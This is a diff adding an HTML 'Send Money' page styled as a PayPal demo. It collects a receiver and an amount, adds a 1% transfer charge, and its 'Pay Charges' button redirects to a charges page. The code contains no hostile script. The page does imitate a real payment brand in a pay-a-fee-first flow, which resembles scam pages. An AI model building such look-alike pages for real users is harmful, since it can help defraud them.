@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send Money - PayPal Demo</title>
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+.send-container{max-width:720px;margin:0 auto;padding:24px 20px}.send-card{background:#fff;border-radius:12px;padding:30px;box-shadow:0 4px 14px rgba(0,0,0,.1)}
+.send-header{text-align:center;margin-bottom:28px}.send-header h1{margin:0 0 8px;color:#003087;font-size:30px}.send-header p{color:#666;margin:0}
+.field{margin-bottom:20px}.field label{display:block;font-weight:600;margin-bottom:8px;color:#333}.field input{width:100%;box-sizing:border-box;padding:14px 15px;border:1px solid #c9c9c9;border-radius:7px;font-size:16px;outline:none}.field input:focus{border-color:#0070ba;box-shadow:0 0 0 2px rgba(0,112,186,.1)}
+.fee-box{display:none;margin:-4px 0 20px;padding:15px;border-radius:8px;background:#f5f9fc;border-left:4px solid #0070ba}.fee-row{display:flex;justify-content:space-between;gap:15px;margin:6px 0;color:#444}.fee-row.total{padding-top:10px;border-top:1px solid #ddd;font-weight:700;color:#111}
+.charge-btn{display:none;width:100%;border:0;border-radius:24px;padding:14px;background:#0070ba;color:#fff;font-size:16px;font-weight:700;cursor:pointer}.charge-btn:hover{background:#005ea6}
+.balance-note{margin-top:18px;padding:12px;background:#f8f9fa;border-radius:7px;color:#666;font-size:14px}.error{display:none;color:#b42318;font-size:14px;margin-top:7px}
+</style>
+</head>
+<body>
+
+<nav class="nav-main">
+<div class="nav-container">
+<div class="nav-logo">
+<img src="/assets/logo.png" alt="PayPal Logo"><span>PayPal</span>
+</div>
+<div class="nav-menu">
+<a href="/dashboard" class="nav-button">
+<i class="fas fa-arrow-left"></i> Back to Dashboard
+</a>
+</div>
+</div>
+</nav>
+
+<div class="container">
+<div class="send-container">
+<div class="send-card">
+
+<div class="send-header">
+<h1>Send Money</h1>
+<p>Send money to another PayPal account in this demo.</p>
+</div>
+
+<form id="sendForm">
+
+<div class="field">
+<label for="receiver">Receiver's PayPal email address or tag</label>
+<input id="receiver" type="text" placeholder="email@example.com or @username" autocomplete="off" required>
+<div class="error" id="receiverError"></div>
+</div>
+
+<div class="field">
+<label for="amount">Amount (USD)</label>
+<input id="amount" type="number" min="0.01" step="0.01" placeholder="0.00" required>
+<div class="error" id="amountError"></div>
+</div>
+
+<div class="fee-box" id="feeBox">
+<div class="fee-row">
+<span>Amount to send</span>
+<strong id="sendAmount">$0.00</strong>
+</div>
+
+<div class="fee-row">
+<span>Transfer charge (1%)</span>
+<strong id="chargeAmount">$0.00</strong>
+</div>
+
+<div class="fee-row total">
+<span>Total required</span>
+<strong id="totalAmount">$0.00</strong>
+</div>
+</div>
+
+<button type="submit" class="charge-btn" id="payChargesBtn">
+<i class="fas fa-lock"></i> Pay Charges
+</button>
+
+</form>
+
+<div class="balance-note">
+<i class="fas fa-info-circle"></i>
+Your 1% transfer charge is calculated automatically from the amount you enter.
+</div>
+
+</div>
+</div>
+</div>
+
+<script>
+const form=document.getElementById('sendForm'),
+receiver=document.getElementById('receiver'),
+amount=document.getElementById('amount'),
+feeBox=document.getElementById('feeBox'),
+sendAmount=document.getElementById('sendAmount'),
+chargeAmount=document.getElementById('chargeAmount'),
+totalAmount=document.getElementById('totalAmount'),
+payChargesBtn=document.getElementById('payChargesBtn');
+
+function money(v){
+return '$'+v.toFixed(2)
+}
+
+function updateCharge(){
+const v=parseFloat(amount.value);
+
+if(!Number.isFinite(v)||v<=0){
+feeBox.style.display='none';
+payChargesBtn.style.display='none';
+return
+}
+
+const c=v*.01;
+
+sendAmount.textContent=money(v);
+chargeAmount.textContent=money(c);
+totalAmount.textContent=money(v+c);
+
+feeBox.style.display='block';
+payChargesBtn.style.display='block'
+}
+
+amount.addEventListener('input',updateCharge);
+
+form.addEventListener('submit',e=>{
+e.preventDefault();
+
+const r=receiver.value.trim(),
+v=parseFloat(amount.value);
+
+if(!r){
+const x=document.getElementById('receiverError');
+x.textContent='Enter the receiver email or tag.';
+x.style.display='block';
+return
+}
+
+document.getElementById('receiverError').style.display='none';
+
+if(!Number.isFinite(v)||v<=0){
+const x=document.getElementById('amountError');
+x.textContent='Enter a valid amount.';
+x.style.display='block';
+return
+}
+
+document.getElementById('amountError').style.display='none';
+
+const c=v*.01;
+
+const p=new URLSearchParams({
+receiver:r,
+amount:v.toFixed(2),
+charge:c.toFixed(2)
+});
+
+window.location.href='/charges-payments.html?'+p.toString()
+});
+</script>
+
+</body>
+</html>
